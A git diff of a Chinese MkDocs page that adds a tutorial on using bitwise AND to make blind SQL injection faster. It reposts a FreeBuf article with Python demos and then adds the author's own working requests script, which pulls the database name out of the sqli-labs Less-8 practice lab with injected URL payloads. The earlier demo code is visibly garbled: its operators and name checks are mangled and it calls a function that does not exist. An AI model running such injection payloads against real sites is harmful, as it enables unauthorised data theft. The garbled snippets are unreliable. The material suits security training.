@@ -357,14 +357,35 @@
       
         <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    抓包
+    与或运算
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
-    反编译
+    与运算
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    或运算
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    通过与运算盲注
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    我的完善
   </a>
   
 </li>
@@ -571,14 +592,35 @@
       
         <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    抓包
+    与或运算
   </a>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
-    反编译
+    与运算
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    或运算
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    通过与运算盲注
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    我的完善
   </a>
   
 </li>
@@ -601,19 +643,135 @@
                 
                 
                 <h1 id="sql">用位运算提高你的sql盲注</h1>
-<p>For full documentation visit <a href="https://www.mkdocs.org">mkdocs.org</a>.</p>
-<h2 id="_1">抓包</h2>
-<ul>
-<li><code>mkdocs new [dir-name]</code> - Create a new project.</li>
-<li><code>mkdocs serve</code> - Start the live-reloading docs server.</li>
-<li><code>mkdocs build</code> - Build the documentation site.</li>
-<li><code>mkdocs -h</code> - Print help message and exit.</li>
-</ul>
-<h2 id="_2">反编译</h2>
-<pre><code>mkdocs.yml    # The configuration file.
-docs/
-    index.md  # The documentation homepage.
-    ...       # Other markdown pages, images and other files.
+<p>SQL 注入是当前 Web 安全中最常见的安全问题之一，其危害性也比较大，众多白帽子在渗透测试过程中往往会首先着重进行 SQL 注入的测试。盲注是 SQL 注入的重要的技术之一，在现实中的 SQL 注入案例中，往往很难将注入的结果直接回显出来。因此，盲注也就成为了 SQL 注入必不可少的手段之一。本文想分享一个如何大大提升盲注效率的技巧。</p>
+<h2 id="_1">与或运算</h2>
+<p>与或运算，操作符分别为 &amp; 以及 |，大多数人应该会在实际开发过程中很少使用到与或运算。如果你之前学过计算机组成原理，里面讲了很多关于补码、反码以及各种运算。当然，我们这里不需要理解那么多知识，这里我们只需要理解与或运算就可以了。</p>
+<h2 id="_2">与运算</h2>
+<p>运算规则： 0 &amp; 0 = 0; 0 &amp; 1 = 0; 1 &amp; 0 = 0; 1 &amp; 1 = 1
+即：两位同时为“1”，结果才为“1”，否则为0</p>
+<h2 id="_3">或运算</h2>
+<p>运算规则：0 | 0 = 0; 0 | 1 = 1; 1 | 0 = 1; 1 | 1 = 1
+即：参加运算的两个对象只要有一个为1，其值为1
+假设参与运算的2个数据，一个数据是1，那么另外一个的值就可以确定了，假设另外一个值为 x：
+1 &amp; x = 0,  x = 0
+1 &amp; x = 1,  x = 1
+所以通过与运算，假设其中的一个数据是已知的，那么另外的值就很好确定了。通过与运算盲注</p>
+<h2 id="_4">通过与运算盲注</h2>
+<p>看到这里，你可能还是一头雾水，与运算和盲注有啥关系？假设一个数字 104，我们可以将它转化为二进制，即 104 = 64 + 32 + 8 = 2 ^ 6 + 2 ^ 5 + 2 ^ 3，我们可以将它以比特位的形式将它表示出来：</p>
+<p><img alt="image-20201202124444243" src="\img\1.png" /></p>
+<p>那么我们可以将104与1，2，4，8，16，32，64，128进行与运算，就可以获得每个比特位上的数据。与1进行运算</p>
+<p><img alt="image-20201202124622020" src="img/image-20201202124622020.png" /></p>
+<p>通过这样的方式，我们就可以确定104每个比特位上的数据是什么。那这和我们SQL盲注又有什么关系呢？对于SQL盲注，我们往往会使用到 substring，我们会对结果的每一个字符来进行枚举，将字符与可能字符来进行比较，这样枚举的效率可能会不太好，往往需要比较很多次。对于一个 acsii 字符，其范围是在0-127之间，那么只需要7个比特位就足够了。那么如果使用与运算的方式，我们只需要比较7次就可以确定这个字符的 ascii 码。通过与运算的方式，可以显著地提高效率，减少比较次数，而且往往字符越多，提升的效果就越明显。</p>
+<p>Talk is cheap, show me the code. 这里我们通过 python 的方式来实现：</p>
+<pre><code class="python">def compute_by_and(word):
+    for ele in word:
+        ele_b, times = get_character(ele)
+        print(f&quot;Guess the value {ele_b}:{chr(ele_b)} with {times} times&quot;)
+def get_character(char):
+    char_b = ord(char)
+    value = 0
+    times = 0
+    for i in range(7):
+        times = times + 1
+        if char_b &amp; (2 i):
+        value = value + (2 i)
+    return value, times
+if name == &quot;main&quot;:
+    compute_bybinary(&quot;hello&quot;)
+</code></pre>
+
+<p><img alt="image-20201202124848757" src="img/image-20201202124848757.png" /></p>
+<p>很明显，每一个字符仅仅只需要7次比较就可以知道这个字符是什么字符了。如果没有数据支撑，这个结果可能对比不是很明显，那我们可以通过其与普通的枚举方式来进行对比，我们选取3个字符来进行对比，myapp,myapp_card,myapp_card_perform。我们枚举的方式选取 string.printable，这个也包含了所有的 ascii 字符。</p>
+<pre><code class="python">import string
+def brute_force(word):
+    times = 0
+    for ele in word:
+        for c in string.printable:
+            times = times + 1
+            if ele == c:
+                break
+    print(f&quot;Brute force {word} with {times} times&quot;)
+if name == &quot;main&quot;:
+    brute_force(&quot;hello_world&quot;)
+</code></pre>
+
+<p><img alt="image-20201202124949634" src="img/image-20201202124949634.png" /></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>myapp</th>
+<th>myapp_card</th>
+<th align="left">myapp_card_perform</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>枚举</td>
+<td>121</td>
+<td>276</td>
+<td align="left">526</td>
+</tr>
+<tr>
+<td>与运算</td>
+<td>35</td>
+<td>70</td>
+<td align="left">126</td>
+</tr>
+</tbody>
+</table>
+<p>总结通过上面的对比，我们可以看出在SQL盲注中，如果通过与运算来进行盲注，可以大大提升盲注的效率，减少请求的次数，这对于我们的测试的帮助意义还是比较大的。</p>
+<p><strong>本文原创作者：madneal@平安银行应用安全团队，本文属于FreeBuf原创奖励计划，未经许可禁止转载</strong></p>
+<p>原文出处：https://www.freebuf.com/articles/web/231741.html</p>
+<h2 id="_5">我的完善</h2>
+<p>看了上面的文章感觉很厉害，那么我们怎么加入到实际的sql注入里呢，</p>
+<p>下面直接贴代码</p>
+<p>以sqli-labs 为靶机 假设已经知道数据库名的长度为8位，那么直接传一个8进去，56次就可以注入出来</p>
+<p>getDataBases 位运算注入</p>
+<p>getDataBases2 默认的通过比较ascii 一个一个字符注入</p>
+<pre><code class="python">import requests
+
+
+def getDataBases(num): #num 表示数据库的长度
+    word=&quot;&quot;
+    times=0   
+    for i in range(1,num+1):
+        value=0
+        for j in range(7):
+            times+=1
+            url=f&quot;http://localhost/sqli-labs-master/Less-8/?id=1%27+and+ord(substr(database(),{i},1))%26{2**j}%23&quot;
+            #print(url)
+            content=requests.get(url).text
+            #print(content)
+            if &quot;You are in&quot; in content:
+                value+=2**j
+        print(f&quot;第{i}个字母是:{chr(value)}&quot;)
+        word+=chr(value)
+    print(f&quot;用了{times}次&quot;)          
+    return word
+
+
+def getDataBases2(num): #num 表示数据库的长度
+    word=&quot;&quot;
+    times=0    
+    for i in range(1,num+1):
+
+        for j in range(48,123):
+            times+=1
+            url=f&quot;http://localhost/sqli-labs-master/Less-8/?id=1%27+and+ord(substr(database(),{i},1))%3d{j}%23&quot;            
+            content=requests.get(url).text            
+            if &quot;You are in&quot; in content:
+                print(f&quot;第{i}个字母是:{chr(j)}&quot;)
+                word+=chr(j)                
+                break
+
+
+    print(f&quot;用了{times}次&quot;)        
+    return word    
+
+
+if __name__ == &quot;__main__&quot;:
+    print(getDataBases(8))    
 </code></pre>
                 
               
